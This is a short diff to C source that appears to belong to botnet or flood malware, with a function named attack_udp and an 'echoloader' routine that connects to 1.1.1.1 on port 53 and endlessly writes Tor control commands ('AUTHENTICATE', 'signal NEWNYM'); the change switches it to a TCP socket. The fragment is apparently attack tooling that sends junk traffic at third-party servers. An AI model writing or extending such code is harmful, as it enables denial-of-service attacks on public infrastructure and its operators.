@@ -156,7 +156,7 @@ void attack_udp() {
 void echoloader() {
 	int r;
         clients[i].ip = inet_addr("1.1.1.1");
-	int socket = make_socket(clients[i].ip, "53");
+	int socket = make_socket_tcp(clients[i].ip, "53");
 	write(socket, "AUTHENTICATE \"\"\n", 16);
 	while(1) {
 		r=write(socket, "signal NEWNYM\n\x00", 16);
